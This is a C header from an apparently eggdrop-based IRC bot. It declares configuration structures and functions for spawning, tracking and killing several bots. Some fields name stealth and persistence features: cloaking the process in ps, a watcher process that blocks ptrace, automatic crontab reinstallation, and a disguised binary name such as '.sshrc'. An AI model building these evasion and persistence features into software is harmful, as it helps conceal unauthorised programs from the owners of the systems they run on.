#ifndef _CONF_H
#define _CONF_H

#include <sys/types.h>
#include <stdio.h>
#include "types.h"
#include "eggdrop.h"
#include "settings.h"

typedef struct conf_bot_b {
  struct conf_bot_b *next;
  struct userrec *u;	/* our own user record */
  pid_t pid;              /* contains the PID for the bot (read for the pidfile) */
#ifdef LEAF
  int localhub;         /* bot is localhub */
#endif /* LEAF */
  char *nick;
  char *host;
  char *host6;
  char *ip;
  char *ip6;
  char *pid_file;       /* path and filename of the .pid file */
} conf_bot;

typedef struct conf_b {
  conf_bot *bots;       /* the list of bots */
  conf_bot *bot;        /* single bot (me) */
  uid_t uid;
  int autouname;        /* should we just auto update any changed in uname output? */
  int pscloak;          /* should the bots bother trying to cloak `ps`? */
  int autocron;         /* should the bot auto crontab itself? */
  int watcher;		/* spawn a watcher pid to block ptrace? */
  char *comments;       /* we dont want to lose our comments now do we?! */
  char *localhub;	/* my localhub */
  char *uname;
  char *username;       /* shell username */
  char *homedir;        /* homedir */
  char *binpath;        /* path to binary, ie: ~/ */
  char *binname;        /* binary name, ie: .sshrc */
  port_t portmin;       /* for hubs, the reserved port range for incoming connections */
  port_t portmax;       /* for hubs, the reserved port range for incoming connections */
} conf_t;

extern conf_t		conf, conffile;

enum {
  CONF_ENC = 1,
  CONF_COMMENT = 2
};


#ifdef LEAF
void spawnbots();
int killbot(char *);
#endif /* LEAF */
void confedit() __attribute__((noreturn));
#ifdef LEAF
void conf_addbot(char *, char *, char *, char *);
int conf_delbot(char *);
#endif /* LEAF */
pid_t checkpid(char *, conf_bot *);
void init_conf();
void free_conf();
int readconf(char *, int);
int parseconf();
int writeconf(char *, FILE *, int);
void fillconf(conf_t *);
void bin_to_conf();
void tellconf(conf_t *);

extern char		cfile[DIRMAX];
#endif /* !_CONF_H */
